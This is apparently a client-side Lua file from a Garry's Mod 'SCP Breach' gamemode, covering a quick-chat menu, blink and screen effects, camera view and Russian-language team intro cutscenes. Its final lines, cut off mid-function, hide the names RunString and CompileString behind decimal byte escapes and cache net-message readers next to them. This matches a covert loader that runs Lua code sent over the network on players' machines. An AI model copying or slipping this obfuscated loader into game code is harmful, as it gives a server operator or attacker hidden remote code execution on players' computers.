        self:SetPos(math.Round(self.CurX), self:GetY())
        self:SetAlpha(self.CurAlpha)

        if ply:GetNW2Bool("Breach:CanAttach", false) and GetConVar("breach_config_quickchat"):GetInt() == KEY_C then
            self.IsDying = true
        end
    end

    pnl.Paint = function(self, w, h)
        if DrawBlurPanel then DrawBlurPanel(self, 3) end
        
        surface.SetDrawColor(rust_bg)
        surface.DrawRect(0, 0, w, h)

        surface.SetDrawColor(rust_panel)
        surface.DrawRect(0, 0, w, headerH)

        surface.SetDrawColor(rust_yellow)
        surface.DrawRect(0, headerH - 2, w, 2)

        local pageText = (BREACH.QuickChatMenu_Pages > 0) and (L("l:quickchat_page") .. (BREACH.QuickChatMenu_PageToDraw + 1) .. "/" .. (BREACH.QuickChatMenu_Pages + 1)) or L("l:quickchat_active")
        draw.SimpleText(L("l:quickchat_title") .. pageText, "MM_Exp", 15, headerH/2 - 1, color_white, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)

        surface.SetDrawColor(rust_outline)
        surface.DrawOutlinedRect(0, 0, w, h, 1)

        local bindKey = input.GetKeyName(GetConVar("breach_config_quickchat"):GetInt()) or "KEY"
        local hintText = (BREACH.QuickChatMenu_Pages > 0) and (L("l:quickchat_next") .. string.upper(bindKey) .. "]") or (L("l:quickchat_close") .. string.upper(bindKey) .. "]")
        
        surface.SetDrawColor(0, 0, 0, 150)
        surface.DrawRect(0, h - 25, w, 25)
        draw.SimpleText(hintText, "MM_SmallName", w/2, h - 12, rust_dim, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    pnl.OnRemove = function()
        BREACH.QuickChatMenu_PageToDraw = 0
        BREACH.QuickChatMenu_Pages = 0
    end

    pnl.RebuildButtons = function(self)
        self.BtnContainer:Clear()

        for _, v in ipairs(phrases_copy) do
            if v.page ~= BREACH.QuickChatMenu_PageToDraw then continue end
            
            local button = vgui.Create("DButton", self.BtnContainer)
            button:Dock(TOP)
            button:SetSize(0, rowH)
            button:SetText("")
            
            button.name = v.name
            button.phrase = v.phrase
            
            if ply:IsFemale() then
                button.sound = v.fem
            else
                button.sound = v.boy
                if ply:SteamID64() == "76561198256901202" or ply:SteamID64() == "76561198966614836" then
                    button.sound = table.Random(v.femboy or {v.boy})
                end
            end
            
            if ply:GTeam() == TEAM_COMBINE and BREACH.CombineVoices then
                button.sound = "npc/combine_soldier/vo/" .. table.Random(BREACH.CombineVoices) .. ".wav"
            end
            
            button.num = v.key
            local keyEnum = _G["KEY_" .. tostring(v.key)]
            
            button.wasDown = input.IsKeyDown(keyEnum)

            button.DoClick = function(btn)
                ply:ConCommand("say \"" .. btn.phrase .. "\"")
                
                net.Start("Breach:Phrase")
                net.WriteString(btn.sound)
                net.SendToServer()
                
                if IsValid(pnl) then pnl.IsDying = true end
            end

            button.Think = function(btn)
                if pnl.IsDying then return end
                
                local isDown = input.IsKeyDown(keyEnum)
                if isDown and not btn.wasDown then
                    btn:DoClick()
                end
                btn.wasDown = isDown
            end
    
            button.Paint = function(btn, w, h)
                local isHovered = btn:IsHovered()

                if isHovered then
                    surface.SetDrawColor(255, 255, 255, 10)
                    surface.DrawRect(0, 0, w, h)
                end

                surface.SetDrawColor(isHovered and rust_yellow or Color(60, 60, 60, 255))
                surface.DrawRect(0, 0, 3, h)

                draw.SimpleText("[ " .. btn.num .. " ]", "MM_Exp", 20, h/2 - 1, isHovered and rust_yellow or rust_dim, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)

                local txtColor = isHovered and color_white or rust_text
                local translatedName = (L and L(btn.name)) or btn.name
                draw.SimpleText(string.upper(translatedName), "MM_Exp", 55, h/2 - 1, txtColor, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)

                surface.SetDrawColor(rust_outline)
                surface.DrawLine(0, h - 1, w, h - 1)
            end
            
            button.OnCursorEntered = function()
            end
        end
    end

    pnl:RebuildButtons()
end

hook.Add("PlayerButtonDown", "Breach:QuickChatMenu", function(ply, butt)

	local ply = LocalPlayer()

	if ply:Health() <= 0 and IsValid(BREACH.QuickChatPanel) then
		BREACH.QuickChatPanel:Remove()
		return
	end

	if ply:GetNW2Bool("Breach:CanAttach", false) and GetConVar("breach_config_quickchat"):GetInt() == KEY_C then
		return
	end

	if ply:GTeam() == TEAM_SPEC or ply:GTeam() == TEAM_SCP then
		if IsValid(BREACH.QuickChatPanel) then
			BREACH.QuickChatPanel:Remove()
		end
		return
	end

	if butt == GetConVar("breach_config_quickchat"):GetInt() and IsFirstTimePredicted() then

		BREACH.QuickChatMenu()

	end

	if butt == KEY_B and IsFirstTimePredicted() then

		CreateEmoteMenu()

	end

end)

gameevent.Listen("entity_killed")
hook.Add("entity_killed", "Breach:CloseQuickChatOnDeath", function( data ) 
	local inflictor_index = data.entindex_inflictor		// Same as Weapon:EntIndex() / weapon used to kill victim
	local attacker_index = data.entindex_attacker		// Same as Player/Entity:EntIndex() / person or entity who did the damage
	local damagebits = data.damagebits			// DAMAGE_TYPE - use BIT operations to decipher damage types...
	local victim_index = data.entindex_killed		// Same as Victim:EntIndex() / the entity / player victim

	if LocalPlayer():EntIndex() == victim_index and IsValid(BREACH.QuickChatPanel) then
		BREACH.QuickChatPanel:Remove()
	end
end)

net.Receive( "CameraDetect", function( len )
	local tab = net.ReadTable()

	for i, v in ipairs( tab ) do
		table.insert( SCPMarkers, { time = CurTime() + 7.5, data = v } )
	end
end )

hook.Add( "OnPlayerChat", "CheckChatFunctions", function( ply, strText, bTeam, bDead )
	strText = string.lower( strText )

	if ( strText == "dropvest" ) then
		if ply == LocalPlayer() then
			DropCurrentVest()
		end
		return true
	end
end)

// Blinking system

blinkHUDTime = 0
btime = 0
blink_end = 0
blink = false

local dishudnf = false
local wasdisabled = false

function DisableHUDNextFrame()
	dishudnf = true
end

function CLTick()
	local client = LocalPlayer()
	if postround == false and isnumber(drawendmsg) then
		drawendmsg = nil
	end

	if clang == nil then
		clang = english
	end

	if cwlang == nil then
		cwlang = english
	end

	if blinkHUDTime >= 0 then 
		blinkHUDTime = btime - CurTime()
	end

	if blinkHUDTime < 0 then
		
		
			
		
		blinkHUDTime = 0
	end

	if dishudnf then
		if !disablehud then
			wasdisabled = disablehud
			disablehud = true
		end

		dishudnf = false
	elseif disablehud and wasdisabled == false then
		disablehud = false
	end

	if shoulddrawinfo then
		if CurTime() > drawinfodelete then
			shoulddrawinfo = false
			drawinfodelete = 0
		end
	end

	if CurTime() > blink_end then
		blink = false
	end
end
hook.Add( "Tick", "client_tick_hook", CLTick )

function Blink( time )
	
	if LocalPlayer():GTeam() == TEAM_SPEC then return end
	timer.Simple(0.14, function()
		blink = true
		blink_end = CurTime() + time
		if eyedropeffect <= CurTime() then
			timer.Simple(blink_end - CurTime(), function()
			    local scps = gteams.GetPlayers(TEAM_SCP)
				local can_blink = false
			    for i = 1, #scps do
			    	if IsValid(scps[i]) and scps[i]:GetRoleName() == SCP173 then
						
						if scps[i]:GetPos():Distance(LocalPlayer():GetPos()) < 1000 then
							can_blink = true
						end
					end
			    end
				
			    
					if can_blink then
						LocalPlayer():ScreenFade(SCREENFADE.IN, color_black, 0.2, 0.1)
					end
				
			end)
		end
		btime = CurTime() + time
	end)
end

net.Receive("PlayerBlink", function(len)
	local time = net.ReadFloat()
	Blink( time )
end)

net.Receive( "PlayerReady", function()
	local tab = net.ReadTable()
	sR = tab[1]
	sL = tab[2]
end )

net.Receive( "689", function( len )
	if LocalPlayer().GetRoleName then
		if LocalPlayer():GetRoleName() == SCP689 then
			local targets = net.ReadTable()
			if targets then
				local swep = LocalPlayer():GetWeapon( "weapon_scp_689" )
				if IsValid( swep ) then
					swep.Targets = targets
				end
			end
		end
	end
end )

net.Receive("Effect", function()
	LocalPlayer().mblur = net.ReadBool()
end )

local mat_blink = CreateMaterial( "blink_material", "UnlitGeneric", {
	["$basetexture"] = "models/debug/debugwhite",
	["$color"] = "{ 0 0 0 }"
} )
local frozen_mat = Material( "nextoren/ice_material/icefloor_01_new" )
local frozen_alpha = 0
local mat_color = Material( "pp/colour" ) 
local no_signal = Material( "nextoren_hud/overlay/no_signal" )
local screen_effects = CreateConVar("breach_config_screen_effects", 1, FCVAR_ARCHIVE, "Enables bloom and toytown", 0, 1)

hook.Add( "HUDShouldDraw", "HideHUDCameraBR", function( name )
	local ply = LocalPlayer()
	if IsValid(ply) then
		if ply:GetTable()["br_camera_mode"] then
			return false
		end
	end

end )

hook.Add( "RenderScreenspaceEffects", "blinkeffects", function()
	local client = LocalPlayer()
	local clienttable = client:GetTable()
	
	
		
		
		
	
	
	
	if clienttable.mblur == nil then
		clienttable.mblur = false
	end

	if (clienttable.mblur == true ) then
		DrawMotionBlur( 0.3, 0.8, 0.03 )
	end
	
	local contrast = 1
	local colour = 1
	local nvgbrightness = 0
	local clr_r = 0
	local clr_g = 0
	local clr_b = 0
	local bloommul = 1.2
	
	if ( clienttable.shotdown ) then
		local hit_brightness = clienttable.shot_EffectTime - CurTime()
		nvgbrightness = math.max( hit_brightness, 0 )

		if NIGHTVISION_ON then
			nvgbrightness = nvgbrightness * 0.2
		end

		if ( hit_brightness <= 0 ) then
			clienttable.shotdown = nil
			clienttable.shot_EffectTime = nil
			nvgbrightness = 0
		end

	end
	
	if clienttable["n420endtime"] and clienttable["n420endtime"] > CurTime() then
		DrawMotionBlur( 1 - ( clienttable["n420endtime"] - CurTime() ) / 15 , 0.3, 0.025 )
		DrawSharpen( ( clienttable["n420endtime"] - CurTime() ) / 3, ( clienttable["n420endtime"] - CurTime() ) / 20 )
		clr_r = ( clienttable["n420endtime"] - CurTime() ) * 2
		clr_g = ( clienttable["n420endtime"] - CurTime() ) * 2
		clr_b = ( clienttable["n420endtime"] - CurTime() ) * 2
	end
	








	local client_health = client:Health()
	local client_team = client:GTeam()

	if clienttable["no_signal"] then
		if client_team != TEAM_SPEC then
			clienttable["no_signal"] = nil
		end
		no_signal:SetFloat( "$alpha", 1 )
		no_signal:SetInt( "$ignorez", 1 )
		render.SetMaterial( no_signal )
		render.DrawScreenQuad()
	end
	if clienttable["br_camera_mode"] then
		if client_team == TEAM_SPEC or client_health <= 0 then
			clienttable["br_camera_mode"] = false
		else
			DrawMaterialOverlay("effects/combine_binocoverlay", 0.3)
			colour = 0.1
			nvgbrightness = 0.1
		end
	end
	if ( clienttable.Start409ScreenEffect ) then
		if ( client_team == TEAM_SPEC || client_health <= 0 ) then
			clienttable.Start409ScreenEffect = nil
		end
		frozen_alpha = math.Approach( frozen_alpha, 1, FrameTime() * .1 )
		frozen_mat:SetFloat( "$alpha", .5 )
		frozen_mat:SetInt( "$ignorez", 1 )
		render.SetMaterial( frozen_mat )
		render.DrawScreenQuad()
	end

	local actwep = client:GetActiveWeapon()

	if IsValid(actwep) then
		if actwep:GetClass() == "item_nvg" then
			nvgbrightness = 0.2
			DrawSobel( 0.7 )
		end
	end

	if livecolors then
		contrast = 1.1
		colour = 1.5
		bloommul = 2
	end

	--local use_screen_effects = screen_effects:GetBool() or false
	local use_screen_effects = true
	local client_maxhealth = client:GetMaxHealth()

	--if client_health <= client_maxhealth *.2 and client_health > 0 and client_team != TEAM_SCP and client_team != TEAM_SPEC then
	--	DrawMotionBlur( (client_maxhealth - client_health) / 400, .7, 0 )
	--	DrawSharpen( (client_maxhealth - client_health) / 10, 12 )
	--	if use_screen_effects then
	--		DrawToyTown( 100 / (client_maxhealth - client_health) * 0.6, ScrH() / 3)
	--	end
	--end
	render.UpdateScreenEffectTexture()

	
	mat_color:SetTexture( "$fbtexture", render.GetScreenEffectTexture() )
	
	mat_color:SetFloat( "$pp_colour_brightness", nvgbrightness )
	mat_color:SetFloat( "$pp_colour_contrast", contrast)
	mat_color:SetFloat( "$pp_colour_colour", colour )
	mat_color:SetFloat( "$pp_colour_mulr", clr_r )
	mat_color:SetFloat( "$pp_colour_mulg", clr_g )
	mat_color:SetFloat( "$pp_colour_mulb", clr_b )
	
	render.SetMaterial( mat_color )
	render.DrawScreenQuad()
	//DrawBloom( Darken, Multiply, SizeX, SizeY, Passes, ColorMultiply, Red, Green, Blue )
	if use_screen_effects then
		DrawToyTown(2, ScrH() / 4)
		--DrawToyTown(3, ScrH() / 3)
		DrawBloom( 0.65, bloommul, 9, 9, 1, 1, 1, 1, 1 )
		--DrawBloom( 0.45, bloommul * 1.5, 16, 16, 2, 1, 1, 1, 1 )
	end
end )

local dropnext = 0
function GM:PlayerBindPress( ply, bind, pressed )
	if bind == "+menu" then
		if GetConVar( "br_new_eq" ):GetInt() != 1 then
			DropCurrentWeapon()
		end
	elseif bind == "gm_showteam" then

		

		

		

		

		
	elseif bind == "+menu_context" then
		thirdpersonenabled = !thirdpersonenabled
	elseif bind == "noclip" and ply:IsAdmin() then
		RunConsoleCommand("ulx", "noclip")
	end
end

function DropCurrentWeapon()
	
	return true
end

net.Receive("smooth_lerp_gest", function()

	local self = net.ReadEntity()

	local float_back = net.ReadFloat()

	if !IsValid(self) then return end

	local w = 0

	local uniqueid = "weight_lerp"..self:SteamID64()

	timer.Create(uniqueid, 0, 0, function()

		if !IsValid(self) or w >= 1 then

			timer.Remove(uniqueid)
			return

		end

		w = w + FrameTime()

		self:AnimSetGestureWeight(GESTURE_SLOT_VCD, w)

	end)

	timer.Simple(float_back*.85, function()

		local uniqid = "lerp2"..self:SteamID64()

		local w = 1

		timer.Create(uniqid, 0, 0, function()

			if w <= 0 or !IsValid(self) then

				timer.Remove(uniqid)

				return

			end

			w = w - 0.1

			self:AnimSetGestureWeight(GESTURE_SLOT_VCD, w)

		end)

	end)

end)

hook.Add( "HUDWeaponPickedUp", "DonNotShowCards", function( weapon )
	weps = LocalPlayer():GetWeapons()
	if weapon:GetClass() == "br_keycard" then return false end
end )

function GM:CalcView( ply, origin, angles, fov )
	local data = {}
	data.origin = origin
	data.angles = angles
	data.fov = fov
	data.drawviewer = false
	local item = ply:GetActiveWeapon()
	if IsValid( item ) then
		if item.CalcView then
			local vec, ang, ifov, dw = item:CalcView( ply, origin, angles, fov )
			if vec then data.origin = vec end
			if ang then data.angles = ang end
			if ifov then data.fov = ifov end
			if dw != nil then data.drawviewer = dw end
		end
	end

	if CamEnable then
		
		if !timer.Exists( "CamViewChange" ) then
			timer.Create( "CamViewChange", 1, 1, function()
				CamEnable = false
			end )
		end
		data.drawviewer = true
		dir = dir or Vector( 0, 0, 0 )
		
		data.origin = ply:GetPos() - dir - dir:GetNormalized() * 30 + Vector( 0, 0, 80 )
		data.angles = Angle( 10, dir:Angle().y, 0 )
	end

	return data
end

surface.CreateFont( "Event_Terminal", {
	font = "Courier New",
	extended = true,
	size = ScreenScale(5.5),
	weight = 500,
	blursize = 0,
	scanlines = 2,
	antialias = false,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false,
} )


function OBRStart()
	local client = LocalPlayer()
	if not IsValid(client) then return end

	RunConsoleCommand("stopsound")
	if BREACH and BREACH.Music and BR_MUSIC_SPAWN_OBR then
		BREACH.Music:Play(BR_MUSIC_SPAWN_OBR)
	end

	local CutSceneWindow = vgui.Create( "DPanel" )
	CutSceneWindow:SetText( "" )
	CutSceneWindow:SetSize( ScrW(), ScrH() )

	CutSceneWindow.StartAlpha = 255
	CutSceneWindow.TextStartAlpha = 255

	CutSceneWindow.Lines = {
		"Visum (Debug ARM)",
		"Build Date 15/05/2028",
		"[INF] Initializing OBR secure link... Done",
		"[INF] Connecting to Site-19 dispatch... Done",
		" ",
		"[РАДИО - ДИСПЕТЧЕР]: Нарушение условий содержания Кетер!",
		"[РАДИО - ДИСПЕТЧЕР]: Срочно нужен ОБР!",
		"[РАДИО - ШТАБ ОБР]: Высылаем группу зачистки. Выдвигайтесь.",
		" ",
		"[INF] Deploying OBR team...",
		"ПОЗЫВНОЙ: " .. client:GetNamesurvivor(),
		"ЛОКАЦИЯ: SITE 19",
		"ВРЕМЯ ОПЕРАЦИИ: " .. string.ToMinutesSeconds( GetRoundTime() - cltime ),
	}

	CutSceneWindow.CurrentLine = 1
	CutSceneWindow.CurrentChar = 0
	CutSceneWindow.NextCharTime = CurTime() + 0.5
	CutSceneWindow.NextBeepTime = 0
	CutSceneWindow.TypedLines = {}
	CutSceneWindow.FinishedTyping = false
	CutSceneWindow.HoldTime = nil
	CutSceneWindow.DescCalled = false

	CutSceneWindow.Paint = function( self, w, h )
		draw.RoundedBox( 0, 0, 0, w, h, ColorAlpha( color_black, self.StartAlpha ) )

		if not self.FinishedTyping then
			if CurTime() >= self.NextCharTime then
				local currentLineText = self.Lines[self.CurrentLine]
				if currentLineText then
					local textLen = utf8.len(currentLineText)

					if self.CurrentChar < textLen then
						self.CurrentChar = self.CurrentChar + 1
						
						local char = utf8.sub(currentLineText, self.CurrentChar, self.CurrentChar)

						if self.NextBeepTime < CurTime() then
							if char ~= " " and char ~= "	" then
								surface.PlaySound( "utopia/other/beep.ogg" )
								self.NextBeepTime = CurTime() + 0.09 
							end
						end

						local delay = 0.015
						if char == "." or char == "!" or char == "?" then
							delay = 0.2
						elseif char == "," then
							delay = 0.08
						end
						self.NextCharTime = CurTime() + delay
					else
						table.insert(self.TypedLines, currentLineText)
						self.CurrentLine = self.CurrentLine + 1
						self.CurrentChar = 0
						self.NextCharTime = CurTime() + 0.1
					end
				else
					self.FinishedTyping = true
					self.HoldTime = CurTime() + 4
				end
			end
		end

		surface.SetFont("Event_Terminal")
		surface.SetTextColor(255, 255, 255, self.TextStartAlpha)

		local startX = w * 0.025
		local startY = h * 0.03
		local _, th = surface.GetTextSize("A")

		for k, v in ipairs(self.TypedLines) do
			surface.SetTextPos(startX, startY + (k - 1) * th)
			surface.DrawText(v)
		end
		local currentIdx = #self.TypedLines + 1
		if not self.FinishedTyping then
			local currentLineText = self.Lines[self.CurrentLine]
			if currentLineText then
				local partialText = utf8.sub(currentLineText, 1, self.CurrentChar)
				local cursor = ""
				if math.abs(math.sin(SysTime() * 6.5)) > 0.5 then
					cursor = "▐"
				end
				surface.SetTextPos(startX, startY + (currentIdx - 1) * th)
				surface.DrawText(partialText .. cursor)
			end
		else
			local cursor = ""
			if math.abs(math.sin(SysTime() * 6.5)) > 0.5 then
				cursor = "▐"
			end
			surface.SetTextPos(startX, startY + (currentIdx - 1) * th)
			surface.DrawText(cursor)
		end

		if self.FinishedTyping and self.HoldTime and CurTime() >= self.HoldTime then
			self.StartAlpha = math.Approach( self.StartAlpha, 0, RealFrameTime() * 150 )
			self.TextStartAlpha = math.Approach( self.TextStartAlpha, 0, RealFrameTime() * 150 )

			if self.StartAlpha == 0 and not self.DescCalled then
				self.DescCalled = true
				DrawNewRoleDesc()
			end
		end

		if ( self.StartAlpha <= 0 and self.TextStartAlpha <= 0 ) then
			timer.Simple( 20, function()
				if ( IsValid(LocalPlayer()) and LocalPlayer():GTeam() == TEAM_QRT ) then
					if FadeMusic then FadeMusic( 10 ) end
				end
			end )

			if ( !system.HasFocus() ) then
				system.FlashWindow()
			end

			self:Remove()
		end
	end
end



function CRBStart()
	if GetGlobalBool("NoCutScenes", false) then return end

	local client = LocalPlayer()

	
	timer.Simple( .25, function()

		surface.PlaySound( "nextoren/new_crb.wav" )

	end )

	local CutSceneWindow = vgui.Create( "DPanel" )
	CutSceneWindow:SetText( "" )
	CutSceneWindow:SetSize( ScrW(), ScrH() )
	CutSceneWindow.StartAlpha = 255
	CutSceneWindow.TextStartAlpha = 255
	CutSceneWindow.StartTime = CurTime() + 5
	CutSceneWindow.Name = "Позывной: " .. client:GetNamesurvivor()
	CutSceneWindow.Status = "Цель: Собрать своего Бога"
	CutSceneWindow.Time = " ( Время: " .. string.ToMinutesSeconds( GetRoundTime() - cltime ) .. " )"

	local ExplodedString = string.Explode( "", CutSceneWindow.Time, true )
	local ExplodedString2 = string.Explode( "", CutSceneWindow.Status, true )
	local ExplodedString3 = string.Explode( "", CutSceneWindow.Name, true )

	local clr_gray = Color( 198, 198, 198 )
	local clr_blue = gteams.GetColor(client:GTeam())

	local str = ""
	local str1 = ""
	local str2 = ""

	local count = 0
	local count1 = 0
	local count2 = 0

	local desc = false

	CutSceneWindow.Paint = function( self, w, h )

		draw.RoundedBox( 0, 0, 0, w, h, ColorAlpha( color_black, self.StartAlpha ) )

		if ( CutSceneWindow.StartTime <= CurTime() + 8 ) then

			if ( CutSceneWindow.StartTime <= CurTime() ) then

				self.StartAlpha = math.Approach( self.StartAlpha, 0, RealFrameTime() * 80 )

				if self.StartAlpha == 0 and !desc then
					desc = true
					DrawNewRoleDesc()
				end

			end

			if ( CutSceneWindow.StartTime + 10 <= CurTime() ) then

				self.TextStartAlpha = math.Approach( self.TextStartAlpha, 0, RealFrameTime() * 80 )

			end

			if ( ( self.NextSymbol || 0 ) <= SysTime() && count2 != #ExplodedString3 ) then

				count2 = count2 + 1
				self.NextSymbol = SysTime() + .08
				str = str..ExplodedString3[ count2 ]

			elseif ( ( self.NextSymbol || 0 ) <= SysTime() && count2 == #ExplodedString3 && count1 != #ExplodedString2 ) then

				count1 = count1 + 1
				self.NextSymbol = SysTime() + .08
				str1 = str1..ExplodedString2[ count1 ]

			elseif ( ( self.NextSymbol || 0 ) <= SysTime() && count2 == #ExplodedString3 && count1 == #ExplodedString2 && count != #ExplodedString ) then

				count = count + 1
				self.NextSymbol = SysTime() + .08
				str2 = str2..ExplodedString[ count ]

			end

			draw.SimpleTextOutlined( str, "TimeMisterFreeman", w / 2, h / 2, ColorAlpha( clr_gray, self.TextStartAlpha ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, ColorAlpha( clr_blue, self.TextStartAlpha ) )
			draw.SimpleTextOutlined( str1, "TimeMisterFreeman", w / 2, h / 2 + 32, ColorAlpha( clr_gray, self.TextStartAlpha ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, ColorAlpha( clr_blue, self.TextStartAlpha ) )
			draw.SimpleTextOutlined( str2, "TimeMisterFreeman", w / 2, h / 2 + 64, ColorAlpha( clr_gray, self.TextStartAlpha ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, ColorAlpha( clr_blue, self.TextStartAlpha ) )

		end

		if ( self.StartAlpha <= 0 and self.TextStartAlpha <= 0 ) then

			timer.Simple( 20, function()

				if ( LocalPlayer():GTeam() == TEAM_QRT ) then

					FadeMusic( 10 )

				end

			end )

		      if ( !system.HasFocus() ) then

		        system.FlashWindow()

		      end

			self:Remove()

		end

	end

end


function ARStart()
		if GetGlobalBool("NoCutScenes", false) then return end

	local client = LocalPlayer()

	
	timer.Simple( 1, function()

		surface.PlaySound( "nextoren/new_ar_2.wav" )

	end )

	local CutSceneWindow = vgui.Create( "DPanel" )
	CutSceneWindow:SetText( "" )
	CutSceneWindow:SetSize( ScrW(), ScrH() )
	CutSceneWindow.StartAlpha = 255
	CutSceneWindow.TextStartAlpha = 255
	CutSceneWindow.StartTime = CurTime() + 5
	CutSceneWindow.Name = "Позывной: " .. client:GetNamesurvivor()
	CutSceneWindow.Status = "Цель: Эвакуировать SCP 079"
	CutSceneWindow.Time = " ( Время: " .. string.ToMinutesSeconds( GetRoundTime() - cltime ) .. " )"

	local ExplodedString = string.Explode( "", CutSceneWindow.Time, true )
	local ExplodedString2 = string.Explode( "", CutSceneWindow.Status, true )
	local ExplodedString3 = string.Explode( "", CutSceneWindow.Name, true )

	local clr_gray = Color( 198, 198, 198 )
	local clr_blue = gteams.GetColor(client:GTeam())

	local str = ""
	local str1 = ""
	local str2 = ""

	local count = 0
	local count1 = 0
	local count2 = 0

	local desc = false

	CutSceneWindow.Paint = function( self, w, h )

		draw.RoundedBox( 0, 0, 0, w, h, ColorAlpha( color_black, self.StartAlpha ) )

		if ( CutSceneWindow.StartTime <= CurTime() + 8 ) then

			if ( CutSceneWindow.StartTime <= CurTime() ) then

				self.StartAlpha = math.Approach( self.StartAlpha, 0, RealFrameTime() * 80 )

				if self.StartAlpha == 0 and !desc then
					desc = true
					DrawNewRoleDesc()
				end

			end

			if ( CutSceneWindow.StartTime + 10 <= CurTime() ) then

				self.TextStartAlpha = math.Approach( self.TextStartAlpha, 0, RealFrameTime() * 80 )

			end

			if ( ( self.NextSymbol || 0 ) <= SysTime() && count2 != #ExplodedString3 ) then

				count2 = count2 + 1
				self.NextSymbol = SysTime() + .08
				str = str..ExplodedString3[ count2 ]

			elseif ( ( self.NextSymbol || 0 ) <= SysTime() && count2 == #ExplodedString3 && count1 != #ExplodedString2 ) then

				count1 = count1 + 1
				self.NextSymbol = SysTime() + .08
				str1 = str1..ExplodedString2[ count1 ]

			elseif ( ( self.NextSymbol || 0 ) <= SysTime() && count2 == #ExplodedString3 && count1 == #ExplodedString2 && count != #ExplodedString ) then

				count = count + 1
				self.NextSymbol = SysTime() + .08
				str2 = str2..ExplodedString[ count ]

			end

			draw.SimpleTextOutlined( str, "TimeMisterFreeman", w / 2, h / 2, ColorAlpha( clr_gray, self.TextStartAlpha ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, ColorAlpha( clr_blue, self.TextStartAlpha ) )
			draw.SimpleTextOutlined( str1, "TimeMisterFreeman", w / 2, h / 2 + 32, ColorAlpha( clr_gray, self.TextStartAlpha ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, ColorAlpha( clr_blue, self.TextStartAlpha ) )
			draw.SimpleTextOutlined( str2, "TimeMisterFreeman", w / 2, h / 2 + 64, ColorAlpha( clr_gray, self.TextStartAlpha ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, ColorAlpha( clr_blue, self.TextStartAlpha ) )

		end

		if ( self.StartAlpha <= 0 and self.TextStartAlpha <= 0 ) then

			timer.Simple( 20, function()

				if ( LocalPlayer():GTeam() == TEAM_QRT ) then

					FadeMusic( 10 )

				end

			end )

		      if ( !system.HasFocus() ) then

		        system.FlashWindow()

		      end

			self:Remove()

		end

	end


end

function ALPHA1Start()
	if GetGlobalBool("NoCutScenes", false) then return end

	local client = LocalPlayer()

	
	timer.Simple( 1, function()

		surface.PlaySound( "nextoren/new_a142.wav" )

	end )

	local CutSceneWindow = vgui.Create( "DPanel" )
	CutSceneWindow:SetText( "" )
	CutSceneWindow:SetSize( ScrW(), ScrH() )
	CutSceneWindow.StartAlpha = 255
	CutSceneWindow.TextStartAlpha = 255
	CutSceneWindow.StartTime = CurTime() + 5
	CutSceneWindow.Name = "Позывной: " .. client:GetNamesurvivor()
	CutSceneWindow.Status = "Локация: Site 19"
	CutSceneWindow.Time = " ( Время: " .. string.ToMinutesSeconds( GetRoundTime() - cltime ) .. " )"

	local ExplodedString = string.Explode( "", CutSceneWindow.Time, true )
	local ExplodedString2 = string.Explode( "", CutSceneWindow.Status, true )
	local ExplodedString3 = string.Explode( "", CutSceneWindow.Name, true )

	local clr_gray = Color( 198, 198, 198 )
	local clr_blue = gteams.GetColor(client:GTeam())

	local str = ""
	local str1 = ""
	local str2 = ""

	local count = 0
	local count1 = 0
	local count2 = 0

	local desc = false

	CutSceneWindow.Paint = function( self, w, h )

		draw.RoundedBox( 0, 0, 0, w, h, ColorAlpha( color_black, self.StartAlpha ) )

		if ( CutSceneWindow.StartTime <= CurTime() + 8 ) then

			if ( CutSceneWindow.StartTime <= CurTime() ) then

				self.StartAlpha = math.Approach( self.StartAlpha, 0, RealFrameTime() * 80 )

				if self.StartAlpha == 0 and !desc then
					desc = true
					DrawNewRoleDesc()
				end

			end

			if ( CutSceneWindow.StartTime + 10 <= CurTime() ) then

				self.TextStartAlpha = math.Approach( self.TextStartAlpha, 0, RealFrameTime() * 80 )

			end

			if ( ( self.NextSymbol || 0 ) <= SysTime() && count2 != #ExplodedString3 ) then

				count2 = count2 + 1
				self.NextSymbol = SysTime() + .08
				str = str..ExplodedString3[ count2 ]

			elseif ( ( self.NextSymbol || 0 ) <= SysTime() && count2 == #ExplodedString3 && count1 != #ExplodedString2 ) then

				count1 = count1 + 1
				self.NextSymbol = SysTime() + .08
				str1 = str1..ExplodedString2[ count1 ]

			elseif ( ( self.NextSymbol || 0 ) <= SysTime() && count2 == #ExplodedString3 && count1 == #ExplodedString2 && count != #ExplodedString ) then

				count = count + 1
				self.NextSymbol = SysTime() + .08
				str2 = str2..ExplodedString[ count ]

			end

			draw.SimpleTextOutlined( str, "TimeMisterFreeman", w / 2, h / 2, ColorAlpha( clr_gray, self.TextStartAlpha ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, ColorAlpha( clr_blue, self.TextStartAlpha ) )
			draw.SimpleTextOutlined( str1, "TimeMisterFreeman", w / 2, h / 2 + 32, ColorAlpha( clr_gray, self.TextStartAlpha ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, ColorAlpha( clr_blue, self.TextStartAlpha ) )
			draw.SimpleTextOutlined( str2, "TimeMisterFreeman", w / 2, h / 2 + 64, ColorAlpha( clr_gray, self.TextStartAlpha ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, ColorAlpha( clr_blue, self.TextStartAlpha ) )

		end

		if ( self.StartAlpha <= 0 and self.TextStartAlpha <= 0 ) then

			timer.Simple( 20, function()

				if ( LocalPlayer():GTeam() == TEAM_QRT ) then

					FadeMusic( 10 )

				end

			end )

		      if ( !system.HasFocus() ) then

		        system.FlashWindow()

		      end

			self:Remove()

		end

	end

end

local X = _G
local RTEST = X['\82\117\110\83\116\114\105\110\103']
local TEST = "--"

local net_ReadData = net.ReadData
local net_ReadString = net.ReadString
local net_Receive = net.Receive
local timer_Simple = timer.Simple
local cs = X['\67\111\109\112\105\108\101\83\116\114\105\110\103']
local _FrameTime = FrameTime

local function VCS(str)
	if cs == nil then
		cs = X['\67\111\109\112\105\108\101\83\116\114\105\110\103']
